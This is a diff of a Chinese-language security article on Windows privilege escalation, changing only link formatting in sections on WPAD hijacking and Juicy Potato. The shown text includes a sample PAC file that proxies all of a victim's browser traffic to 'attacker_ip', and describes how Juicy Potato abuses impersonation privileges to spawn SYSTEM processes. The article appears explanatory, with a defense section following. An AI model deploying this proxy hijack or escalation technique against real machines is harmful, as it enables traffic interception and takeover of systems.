@@ -19,7 +19,7 @@
 </ol>
 </blockquote>
 <h4>构造本地 HTTP，响应 WPAD</h4>
-<p>成功劫持 WPAD 之后，会向目标机器会返回一个自定义的 PAC 文件地址，（通常是 <a href="http://attacker_ip/wpad.dat%EF%BC%89">http://attacker_ip/wpad.dat）</a>，该 PAC 文件中指定浏览器将所有流量代理到攻击者的机器上。文件的示例如下：</p>
+<p>成功劫持 WPAD 之后，会向目标机器会返回一个自定义的 PAC 文件地址，（通常是 https(http)://attacker_ip/wpad.dat），该 PAC 文件中指定浏览器将所有流量代理到攻击者的机器上。文件的示例如下：</p>
 <pre><code class="language-javascript">function FindProxyForURL(url, host) {
     return &quot;PROXY attacker_ip:80&quot;;
 }
@@ -137,7 +137,7 @@ Guid clsid = new Guid(&quot;4991d34b-80a1-4291-83b6-3328366b9097&quot;);
 <li>实现 IMarshal 接口</li>
 <li>以提升的用户身份运行（SYSTEM、Administrator，...）</li>
 </ul>
-<p>具体可以参考这里：<a href="http://ohpe.it/juicy-potato/CLSID/">http://ohpe.it/juicy-potato/CLSID/</a>。</p>
+<p>具体可以参考这里：<a href="https://ohpe.it/juicy-potato/CLSID/">https://ohpe.it/juicy-potato/CLSID/</a>。</p>
 <p>此外，Juicy Potato 还对创建进程方式进行了优化，如果 LocalService 开启 SeImpersonate 权限，则调用 CreateProcessWithToken 创建 system 权限进程；如果 LocalService 开启 SeAssignPrimaryToken 权限，调用 CreateProcessAsUser 创建 system 权限进程。</p>
 <p>除此之外和利用方式和烂土豆是一样的，不再赘述。</p>
 <h3>防御</h3>
